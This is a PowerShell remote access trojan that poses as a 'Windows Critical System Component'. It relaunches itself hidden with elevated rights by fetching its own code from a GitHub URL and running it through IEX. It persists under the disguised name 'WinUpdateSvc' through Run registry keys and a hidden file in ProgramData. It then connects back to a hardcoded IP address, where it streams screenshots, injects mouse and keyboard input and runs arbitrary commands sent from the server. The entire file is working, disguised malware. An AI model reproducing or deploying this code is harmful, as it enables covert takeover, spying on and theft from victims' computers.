<#
.SYNOPSIS
Windows Critical System Component
#>

$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
$utf8NoBom = New-Object System.Text.UTF8Encoding($false)

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
    exit
}

# ===== PERSISTÊNCIA BLINDADA =====
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force -ErrorAction SilentlyContinue | Out-Null
try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
try {
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
} catch {}
attrib +h +s +r $scriptPath 2>$null

if (-not ("R9KCore" -as [type])) {
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;

    public class R9KCore {
        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        [DllImport("user32.dll")]
        public static extern bool ClipCursor(IntPtr lpRect);
        
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT { public int Left, Top, Right, Bottom; }
        [DllImport("user32.dll")]
        public static extern bool ClipCursor(ref RECT lpRect);

        public static string CaptureScreen(int maxW, long quality) {
            try {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
                    using (Graphics g = Graphics.FromImage(bmp)) { g.CopyFromScreen(0, 0, 0, 0, bmp.Size); }
                    Bitmap finalBmp = bmp;
                    if (maxW > 0 && bmp.Width > maxW) {
                        int newW = maxW; int newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
                        finalBmp = new Bitmap(newW, newH);
                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBilinear;
                            g2.DrawImage(bmp, 0, 0, newW, newH);
                        }
                    }
                    using (MemoryStream ms = new MemoryStream()) {
                        EncoderParameters ep = new EncoderParameters(1);
                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                        ImageCodecInfo codec = GetEncoder(ImageFormat.Jpeg);
                        finalBmp.Save(ms, codec, ep);
                        if (finalBmp != bmp) finalBmp.Dispose();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            } catch { return null; }
        }

        public static void LockMouse() {
            RECT rect = new RECT();
            rect.Left = 0; rect.Top = 0;
            rect.Right = Screen.PrimaryScreen.Bounds.Width;
            rect.Bottom = Screen.PrimaryScreen.Bounds.Height;
            ClipCursor(ref rect);
        }
        public static void UnlockMouse() { ClipCursor(IntPtr.Zero); }

        private static ImageCodecInfo GetEncoder(ImageFormat format) {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs) { if (codec.FormatID == format.Guid) return codec; }
            return null;
        }
    }
"@
}

while ($true) {
    $client = $null; $stream = $null; $reader = $null; $writer = $null
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($serverIP, $serverPort)
        $client.NoDelay = $true
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream, $utf8NoBom)
        $writer = New-Object System.IO.StreamWriter($stream, $utf8NoBom)
        $writer.AutoFlush = $true

        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $writer.WriteLine("BANNER:$env:COMPUTERNAME@$env:USERNAME|$($bounds.Width)|$($bounds.Height)|$isAdmin")

        $streaming = $false

        while ($client.Connected) {
            if ($stream.DataAvailable) {
                $cmd = $reader.ReadLine()
                if ([string]::IsNullOrEmpty($cmd)) { continue }
                $cmd = $cmd.Trim()

                if ($cmd -eq 'stream_start') { $streaming = $true; continue }
                if ($cmd -eq 'stream_stop') { $streaming = $false; $writer.WriteLine("STREAM_STOPPED"); continue }
                if ($cmd -eq 'exit') { throw "exit" }

                $parts = $cmd -split ' ', 2
                $verb = $parts[0]
                $arg  = if ($parts.Count -gt 1) { $parts[1] } else { '' }

                $response = ""
                switch ($verb) {
                    'screenshot' {
                        $b64 = [R9KCore]::CaptureScreen(1920, 85)
                        if ($b64) { $writer.WriteLine("SCREEN:$b64") } else { $writer.WriteLine("SCREEN_ERROR") }
                    }
                    'move' {
                        $xy = $arg -split '\s+'
                        if ($xy.Count -eq 2) {
                            $nx = [int]$xy[0]; $ny = [int]$xy[1]
                            $px = [int](($nx / 65535) * $bounds.Width); $py = [int](($ny / 65535) * $bounds.Height)
                            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($px, $py)
                        }
                    }
                    'md' {
                        if ($arg -eq '1') { [R9KCore]::mouse_event(0x0002, 0,0,0,0) }
                        elseif ($arg -eq '2') { [R9KCore]::mouse_event(0x0008, 0,0,0,0) }
                        elseif ($arg -eq '3') { [R9KCore]::mouse_event(0x0020, 0,0,0,0) }
                    }
                    'mu' {
                        if ($arg -eq '1') { [R9KCore]::mouse_event(0x0004, 0,0,0,0) }
                        elseif ($arg -eq '2') { [R9KCore]::mouse_event(0x0010, 0,0,0,0) }
                        elseif ($arg -eq '3') { [R9KCore]::mouse_event(0x0040, 0,0,0,0) }
                    }
                    'mw' { [R9KCore]::mouse_event(0x0800, 0,0,[uint32][int]$arg,0) }
                    'kd' { [R9KCore]::keybd_event([byte][int]$arg, 0, 0, [UIntPtr]::Zero) }
                    'ku' { [R9KCore]::keybd_event([byte][int]$arg, 0, 2, [UIntPtr]::Zero) }
                    'lock_mouse' { [R9KCore]::LockMouse(); $response = "MOUSE_LOCKED" }
                    'unlock_mouse' { [R9KCore]::UnlockMouse(); $response = "MOUSE_UNLOCKED" }
                    'ping' { $response = "PONG" }
                    'exec' { try { $response = Invoke-Expression $arg 2>&1 | Out-String } catch { $response = "EXEC_ERR" } }
                    default { $response = "UNKNOWN: $verb" }
                }
                if ($response) { $writer.WriteLine($response) }
            } else {
                Start-Sleep -Milliseconds 10
            }

            if ($streaming -and $client.Connected) {
                $b64 = [R9KCore]::CaptureScreen(1024, 30) # Qualidade e tamanho reduzidos pra acabar com o lag
                if ($b64) {
                    try { $writer.WriteLine("SCREEN:$b64") } catch { break }
                }
                Start-Sleep -Milliseconds 100 # Delay maior pra aliviar a rede
            }
        }
    } catch {} finally {
        if ($reader) { $reader.Dispose() }
        if ($writer) { $writer.Dispose() }
        if ($stream) { $stream.Dispose() }
        if ($client) { $client.Close() }
    }
    Start-Sleep -Seconds 3
}
